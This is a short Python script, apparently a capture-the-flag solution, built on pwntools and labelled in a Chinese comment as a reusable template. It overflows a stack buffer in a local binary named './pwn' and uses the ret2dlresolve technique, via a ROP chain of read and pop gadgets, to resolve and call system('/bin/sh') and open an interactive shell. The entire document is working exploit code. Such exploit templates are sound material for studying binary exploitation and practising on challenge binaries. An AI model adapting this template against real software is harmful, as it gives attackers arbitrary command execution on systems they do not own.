from pwn import *

context(log_level='debug', os='linux', arch='amd64')

p = process('./pwn')
elf = ELF('./pwn')

offset = 0x108
read_plt = elf.plt['read']
start_resolve = 0x401020
pop_rdi = 0x40113a
pop_rsi_r15 = 0x401138

# 下面是模板部分，注意有能控制几个参数的gadgets就可以执行几个参数
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh\x00'])

payload = b'a' * offset + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(dlresolve.data_addr) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(dlresolve.real_args[0])
payload += p64(start_resolve) + p64(dlresolve.reloc_index)
p.send(payload)
p.send(dlresolve.payload)

p.interactive()